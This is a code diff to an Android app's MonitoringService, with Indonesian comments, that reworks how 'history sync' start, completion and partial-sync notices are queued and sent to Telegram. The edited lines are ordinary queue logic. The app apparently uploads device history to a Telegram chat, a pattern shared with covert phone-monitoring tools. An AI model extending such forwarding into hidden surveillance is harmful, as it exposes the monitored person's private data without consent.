@@ -5627,7 +5627,13 @@ class MonitoringService : Service() {
                 return
             }
             if (!initialStartSent) {
-                initialStartSent = sendToTelegram(startMessage)
+                // Pembuka ikut prioritas (issue #887): potongan
+                // riwayat terantre prioritas dan worker menguras
+                // prioritas lebih dulu, jadi pembuka yang terantre
+                // non-prioritas tiba SESUDAH riwayatnya. Status
+                // QUEUED kini juga dihitung terkirim (tak diulang)
+                // agar pembuka tak ganda dari antrean + kirim ulang.
+                initialStartSent = sendFitted(startMessage, queueOnFail = true, queuePriority = true) != SendStatus.DROPPED
                 delay(500)
             }
             var initialOk = true
@@ -5775,7 +5781,9 @@ class MonitoringService : Service() {
                 if (pausedAtTail) {
                     initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 60_000L
                 } else {
-                    sendToTelegram(completeMessage)
+                    // Penutup juga prioritas (issue #887) agar tak
+                    // didahului potongan riwayat yang terantre.
+                    sendFitted(completeMessage, queueOnFail = true, queuePriority = true)
                     initialSyncRetryAt = 0L
                     initialStartSent = false
                     initialPartialNotified = false
@@ -5784,7 +5792,9 @@ class MonitoringService : Service() {
             } else {
                 initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
                 if (!pausedAtTail && !initialPartialNotified) {
-                    initialPartialNotified = sendToTelegram("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.")
+                    // Seprioritas juga (issue #887); QUEUED dihitung
+                    // sudah diberitahu agar tak terkirim ganda.
+                    initialPartialNotified = sendFitted("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.", queueOnFail = true, queuePriority = true) != SendStatus.DROPPED
                 }
             }
             idleDataCycles = 0
